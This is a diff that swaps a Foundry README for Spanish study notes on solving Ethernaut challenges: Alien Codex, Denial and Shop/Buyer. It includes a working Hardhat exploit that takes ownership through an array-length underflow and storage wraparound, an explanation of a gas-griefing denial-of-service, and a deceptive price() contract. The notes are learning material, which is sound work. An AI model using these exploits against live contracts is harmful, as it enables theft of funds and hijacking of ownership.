@@ -1,66 +1,91 @@
-## Foundry
+# Comentarios y aprendizajes de resolver el ethernaut
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+## Alien Code X
 
-Foundry consists of:
+Clave entender como funcionan los arrays dinámicos en solidity, es decir, los que se definen por ejemplo `bytes32[]`. En el slot de memoria correspondiente solo se va a guardar el tamaño del array en cuestión, pero la data se va a alojar en el `keccak(slot_id)`.
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
+Imagino que luego solidity lo que hace es: si tengo que leer de la posición 15, voy a buscar el elemento en la dirección `keccak(slot_id) + 15`.
 
-## Documentation
+Para resolverlo hay que, de alguna manera, forzar a escribir en el slot 0 donde está el owner del contrato.
 
-https://book.getfoundry.sh/
+- slot_0
+- .
+- .
+- slot_array = keccak(1) = 0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6 = 90743482286830539503240959006302832933333810038750515972785732718729991261126
 
-## Usage
+Es decir, cuando quiero escribir en el index 0 del array, en verdad estoy queriendo escribir en en slot 90743482286830539503240959006302832933333810038750515972785732718729991261126. Si escribo en MAX_SLOT_ID - 90743482286830539503240959006302832933333810038750515972785732718729991261126 escribiré en el slot 0, porque me voy a pasar por overflow.
 
-### Build
+```
+    const [firstOwner, usurper] = await ethers.getSigners();
 
-```shell
-$ forge build
+    const factory = await ethers.getContractFactory("Alien");
+    const alien = await factory.deploy();
+    const contractAddy = await alien.getAddress();
+
+    await alien.makeContact();
+    // Con este valor en el slot de storage 1, podre reemplazar el owner por el que yo quiero.
+    const desiredStorageValueWithNewOwner = `0x000000000000000000000001${usurper.address.substring(
+      2
+    )}`;
+    // Al hacer retract, por el underflow de uint, el contrato asume que el array codex tiene la capacidad llena.
+    // Con eso, me dejara escribir con el metodo `revise` en cualquier dirección
+    await alien.retract();
+
+    // por como funciona el dynamic array storage, este hash es la dirección de memoria donde estan los datos del array de manera consecutiva.
+    const secondSlotHash = ethers.keccak256(
+      "0x0000000000000000000000000000000000000000000000000000000000000001"
+    );
+    const startArrayStorageDirection = ethers.toBigInt(secondSlotHash);
+    const valorEnStorage = await ethers.provider.getStorage(
+      contractAddy,
+      startArrayStorageDirection
+    );
+    // Por definicion de solidity, todo contrato tiene 2^256 slots de memoria
+    const MAX_CONTRACT_SLOT_ID = ethers.toBigInt(2) ** ethers.toBigInt(256);
+    // MAX_CONTRACT_SLOT_ID - startArrayStorageDirection es la distancia que hay desde
+    // el slot de memoria donde arrancan los valores del array, hasta que me paso por overflow
+    // al primer slot de memoria (donde justo esta el valor del addres!!)
+    await alien.revise(
+      MAX_CONTRACT_SLOT_ID - startArrayStorageDirection,
+      desiredStorageValueWithNewOwner
+    );
+    expect(await alien.owner()).to.equal(usurper.address);
 ```
 
-### Test
+## Denial
 
-```shell
-$ forge test
+El contrato tiene un owner definido. Recibe fondos en ese contrato, y cualquiera pueda ejecutar la funciona withdraw que lo que hace es enviar un 1% de los fondos al owner, y otro 1% al que ejecuta la transacción.
+
+Acá la papa está en que no se chequea el resultado del call al partner (adrede) para que eso no bloquee que le lleguen los fondos al owner.
+
+```
+function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value: amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] += amountToSend;
+    }
 ```
 
-### Format
+Entonces si el partner es un contrato, y adentro hace cualquier fruta, eso queda en un loop donde nunca el owner puede extraer los fondos. Queda bloqueado. Para sortear eso, donde queremos que "no nos importe revertir" la mejor práctica sería ponerle un gaslimit al call a un contrato externo. Esto haría que revierta el call, pero como no nos importa el resultado, el owner seguiría recibiendo sus fondos.
 
-```shell
-$ forge fmt
+### Buyer
+
+Acá se define una interfaz que debe ser implementada por el msg.sender. El tema es que quien la implementa puede definir el comportamiento que sea, entonces muy probablemente con implementar la interfaz y hacer que el método view "price" devuelva un precio mayor al del contrato `Shop` sea suficiente.
+
+Ok no, en específico dice que el precio debe ser menor.
+
+Lo clave está en que al ser una función view (y no pure) la misma puede acceder al estado de otros contratos, entonces, se puede hacer algo de este estilo:
+
 ```
-
-### Gas Snapshots
-
-```shell
-$ forge snapshot
-```
-
-### Anvil
-
-```shell
-$ anvil
-```
-
-### Deploy
-
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
-
-### Cast
-
-```shell
-$ cast <subcommand>
-```
-
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
+function price() external view returns (uint) {
+        if (shop.isSold()) {
+            return 50;
+        }
+        return 150;
+    }
 ```
